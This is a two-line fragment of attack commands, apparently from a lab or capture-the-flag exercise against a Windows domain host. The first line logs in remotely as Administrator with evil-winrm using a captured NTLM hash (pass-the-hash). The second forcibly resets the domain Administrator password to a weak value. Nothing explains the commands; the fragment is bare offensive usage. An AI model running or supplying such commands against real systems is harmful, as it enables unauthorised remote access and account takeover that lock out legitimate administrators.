

`evil-winrm -i 10.129.81.196 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'`

`Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Reset`

